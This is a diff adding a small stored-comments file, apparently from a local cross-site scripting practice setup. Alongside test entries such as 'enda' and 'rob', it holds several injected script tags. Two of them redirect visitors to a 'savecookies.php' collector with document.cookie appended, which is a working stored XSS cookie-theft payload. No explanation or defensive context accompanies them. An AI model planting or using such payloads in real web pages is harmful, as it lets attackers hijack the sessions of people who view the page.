@@ -1,0 +1,13 @@
+enda<hr/>
+rob<hr/>
+enda<hr/>
+enda<hr/>
+enda<hr/>
+<h1>Enda</h1><hr/>
+<script type="text/javascript">window.location = 'http://localhost/hacked/XSS/savecookies.php?cookies=hello';</script><hr/>
+<script type="text/javascript">window.location = 'http://localhost/hacked/XSS /savecookies.php?cookies='+document.cookie;</script><hr/>
+<script type="text/javascript">window.location = 'http://localhost/hacked/XSS /savecookies.php?cookies='+document.cookie;</script><hr/>
+hello
+<hr/>
+<h3>Post Comment</h3><hr/>
+<h1>Post Comment</h1><hr/>
